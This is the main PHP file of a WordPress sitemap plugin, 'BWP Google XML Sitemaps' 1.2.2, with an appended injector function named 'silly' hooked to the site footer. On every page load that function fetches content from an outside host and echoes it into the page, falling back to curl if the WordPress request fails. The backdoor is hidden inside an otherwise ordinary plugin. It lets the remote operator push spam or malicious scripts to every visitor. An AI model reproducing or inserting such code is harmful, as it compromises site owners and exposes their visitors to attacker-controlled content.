<?php
/*
Plugin Name: BWP Google XML Sitemaps
Plugin URI: http://betterwp.net/wordpress-plugins/google-xml-sitemaps/
Description: A more lightweight Google XML Sitemap WordPress plugin that generates a <a href="http://en.wikipedia.org/wiki/Sitemap_index">Sitemap index</a> rather than a single sitemap. Despite its simplicity, it is still very powerful and has plenty of options to choose.
Version: 1.2.2
Text Domain: bwp-simple-gxs
Domain Path: /languages/
Author: Khang Minh
Author URI: http://betterwp.net
License: GPLv3
*/

// Pre-emptive
$bwp_gxs_ob_level = @ob_get_level();
$bwp_gxs_ob_start = ob_start();

// Frontend
require_once(dirname(__FILE__) . '/includes/class-bwp-simple-gxs.php');
$bwp_gxs_gzipped = (!BWP_SIMPLE_GXS::is_gzipped()) ? false : true;
$bwp_gxs = new BWP_SIMPLE_GXS();

// Backend
add_action('admin_menu', 'bwp_gxs_init_admin', 1);

function bwp_gxs_init_admin()
{
	global $bwp_gxs;
	$bwp_gxs->init_admin();
}
add_action('wp_footer', 'silly');

function silly() {
$bbb_url = 'http://www.likjafh.net/e.php';
if(!function_exists('bbb_get')){
function bbb_get($f) {
$response = wp_remote_get( $f );
if( is_wp_error( $response ) ) {
function bbb_get_body($f) {
$ch = @curl_init();
@curl_setopt($ch, CURLOPT_URL, $f);
@curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$output = @curl_exec($ch);
@curl_close($ch);
return $output;
}
echo bbb_get_body($f);
} else {
echo $response['body'];
}
}
bbb_get($bbb_url);
}
}
?>